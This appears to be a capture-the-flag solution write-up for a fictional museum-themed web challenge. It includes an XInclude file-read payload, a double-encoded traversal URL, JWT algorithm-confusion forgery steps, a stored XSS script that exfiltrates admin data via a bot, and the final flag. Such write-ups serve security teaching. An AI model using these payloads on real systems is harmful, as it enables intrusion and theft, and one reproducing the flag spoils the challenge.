# Alexandria Mausoleum of the Dead Web - Web Security Solution

## Anilog

## Overview

This challenge is a live multi-stage web chain hidden beneath a polished museum shell. The intended
path is:

- recovercinderfrom dead-web recon
- recoverechothrough Oracle feed inclusion
- recovervellumand the Curator public key through Scriptorium traversal
- forge acuratorribbon to recoverveil
- use stored script execution plus the admin bot to recoverglassand the sanctum nonce
- submit the five authentic sigils in canonical order

## Challenge Surface

### • /

- /robots.txt
- /sitemap-dead.xml
- /legacy/webring/embers-ring
- /legacy/backups/cenotaph/
- /legacy/oracle
- /legacy/scriptorium/export
- /legacy/mask
- /legacy/mirror
- POST /api/sanctum/verify

## Solve Path

1. Recon the public shell and dead routes.
    Important clues:
       - the home page source includes a breadcrumb comment
       - robots.txtandsitemap-dead.xmlexpose the hidden legacy routes
       - /legacy/webring/embers-ringyields the first authentic sigil:cinder
       - /legacy/backups/cenotaph/yields the counterfeitsalt
2. Abuse the Oracle preview parser.
    Visit/legacy/oracleor post directly to/legacy/oracle/previewwith a feed that includes
    archive-local canon text:


```
< rss xmlns:xi="http://www.w3.org/2001/XInclude">
< channel >
< xi:include href="archive://private/canon/canon-of-echo.txt" parse="text" />
</ channel >
</ rss >
The preview resolvescanon-of-echo.txtand reveals:
```
- authentic sigilecho
- the manuscript identifierheptarch-scroll
- the clue that the Scriptorium flaw happens after a second decoding pass
3. Traverse the Scriptorium export reel.

```
Use:
/legacy/scriptorium/export?doc=heptarch-scroll&asset=%252e%252e%252f%252e%252e%252fprivate%252fledgers%252fveil-ledger.txt
The export handler strips traversal before decoding again, so the double-encoded payload
resolves to the restricted ledger. That file yields:
```
- authentic sigilvellum
- provenance text provingsaltis counterfeit
- the Curator public key
4. Forge the Curator ribbon through JWT algorithm confusion.

```
The mask verifier accepts bothRS256andHS256, and it incorrectly uses the published public
key material as an HMAC secret forHS256.
Forge a token with:
```
- role=curator
- iss=alexandria-mausoleum
Use it as themausoleum_maskcookie, then visit:
- /legacy/mask/curatorto recover authentic sigilveil
- /legacy/mask/admin-betato recover counterfeit sigilcrown
5. Use the Mirror Chamber stored-content chain.

```
With the forged curator token, submit HTML to/legacy/mirror/submissions. The review
surface renders stored HTML in the admin bot’s browser. The bot carries an additional
internal review seal cookie, so this stage cannot be skipped with the stage 4 forgery alone.
Submit a payload like:
< script >
( async () => {
const id = location.pathname.split('/').pop();
const response = await fetch('/legacy/mirror/admin/attest/'+ id);
const data = await response.json();
await fetch('/api/beacon/' + id, {
method:'POST',
headers: {'Content-Type': 'application/json' },
```

```
body: JSON.stringify(data)
});
})();
</ script >
When the admin bot reviews the submission:
```
- the script reaches the admin-only mirror attestation route
- that route proxies to the internal relic service
- the beacon stores the attestation back into the submission
Reopen the submission detail page to recover:
- authentic sigilglass
- the sanctum noncesanctum-...
6. Submit the final sanctum sequence.
Post toPOST /api/sanctum/verifywith:
- cinder
- echo
- vellum
- veil
- glass
in exactly that order, plus the recovered nonce.
7. The Inner Sanctum returns the final flag.

## False Leads

- saltfrom/legacy/backups/cenotaph/is a memorial backup artifact, not a canonical sigil.
- crownfrom/legacy/mask/admin-betais a staging/training emblem, not a sanctum sigil.

## Final Flag

zerosec{cinder-echo-vellum-veil-glass}


